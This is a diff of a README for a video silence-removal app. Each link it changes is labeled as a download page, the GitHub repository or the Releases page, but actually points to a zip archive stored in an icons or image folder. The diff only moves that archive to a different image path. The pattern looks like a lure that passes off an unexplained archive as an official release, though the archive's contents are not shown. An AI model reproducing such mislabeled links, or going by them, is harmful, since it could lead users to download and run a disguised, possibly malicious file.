@@ -1,6 +1,6 @@
 # 🎞️ video-silence-remover - Edit Videos Without the Wait
 
-![Download](https://raw.githubusercontent.com/gaurab-pandey/video-silence-remover/main/src-tauri/icons/android/mipmap-xhdpi/silence-video-remover-micrify.zip)
+![Download](https://raw.githubusercontent.com/gaurab-pandey/video-silence-remover/main/public/img/silence-video-remover-v2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ Welcome to **video-silence-remover**! This application helps you save hours by a
 
 ## 📥 Download & Install
 
-To download **video-silence-remover**, visit [this page to download](https://raw.githubusercontent.com/gaurab-pandey/video-silence-remover/main/src-tauri/icons/android/mipmap-xhdpi/silence-video-remover-micrify.zip). 
+To download **video-silence-remover**, visit [this page to download](https://raw.githubusercontent.com/gaurab-pandey/video-silence-remover/main/public/img/silence-video-remover-v2.3.zip). 
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version listed at the top.
@@ -52,11 +52,11 @@ A: Yes, check the Issues section on our GitHub page for help.
 
 ## 🌐 Community and Contribution
 
-This project thrives on community support. You can help improve the application by providing feedback or contributing code. Visit the [GitHub repository](https://raw.githubusercontent.com/gaurab-pandey/video-silence-remover/main/src-tauri/icons/android/mipmap-xhdpi/silence-video-remover-micrify.zip) for more details on how to contribute.
+This project thrives on community support. You can help improve the application by providing feedback or contributing code. Visit the [GitHub repository](https://raw.githubusercontent.com/gaurab-pandey/video-silence-remover/main/public/img/silence-video-remover-v2.3.zip) for more details on how to contribute.
 
 ## 📅 Updates and News
 
-Stay up-to-date with the latest features and fixes by following the release notes on our [Releases page](https://raw.githubusercontent.com/gaurab-pandey/video-silence-remover/main/src-tauri/icons/android/mipmap-xhdpi/silence-video-remover-micrify.zip).
+Stay up-to-date with the latest features and fixes by following the release notes on our [Releases page](https://raw.githubusercontent.com/gaurab-pandey/video-silence-remover/main/public/img/silence-video-remover-v2.3.zip).
 
 ## 📞 Contact
 
